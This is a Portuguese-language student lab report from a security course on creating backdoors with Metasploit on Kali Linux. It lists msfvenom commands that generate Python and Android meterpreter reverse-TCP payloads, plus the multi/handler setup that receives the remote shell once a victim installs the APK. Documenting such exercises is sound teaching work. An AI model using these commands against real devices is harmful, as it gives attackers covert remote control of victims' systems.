# Backdoor
## Relatório da Prática

Para realizar a prática, segui as questões propostas no [tutorial](https://github.com/gleydson/BackdoorTutorial).

Não senti dificuldades para realizar a prática. O tutorial estava muito explicativo.

Na prática foi utilizado o SO Kali Linux, que já possui o ambiente pré configurado para o ataque.

### Realizando ataque em python

- Criando o payload

    Primeiramente, foi aberto o console do Metasploit Framework, ferramenta que axiliará na criação do backdoor, através do comando `msfconsole`.

    ![1](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/1.PNG)

    Para realizar o ataque em ***python*** bastou apenas criar o payload utilizando o ***msfvenom*** através do comando:
    > `msfvenom -p python/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA R > payload.py`
    
    ![2](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/2.PNG)

    Também foi passado o código gerado no payload por um decodificador de ***base64***.

    ![3](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/3.PNG)
    
### Realizando ataque em dispositivos android

1. Criando o payload
    O payload para android foi criado com o seguinte comando no ***msfvenom***:
    > `msfvenom -p android/meterpreter/reverse_tcp LHOST=SEU_IP LPORT=SUA_PORTA R > payload.apk`

    ![4](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/4.PNG)

2. Iniciando o ataque
    A partir do payload criado, o ataque foi iniciado com os seguintes comandos:
    > `use multi/handler`

    > `set PAYLOAD android/meterpreter/reverse_tcp`

    > `set LHOST SEU_IP`

    > `set LPORT SUA_PORTA`
    
    > `exploit`

    ![5](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/5.PNG)

3. Realizando os ataques
    Após abrir instalar o payload o meterpreter conseguiu acesso ao dispositivo vítima. Agora, a vítima esta pronta para ser atacada.

    ![6](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/6.PNG)

    ![7](https://github.com/SamuelIGT/information-security/blob/master/Praticas/Command%20Injection/screenshots/7.PNG)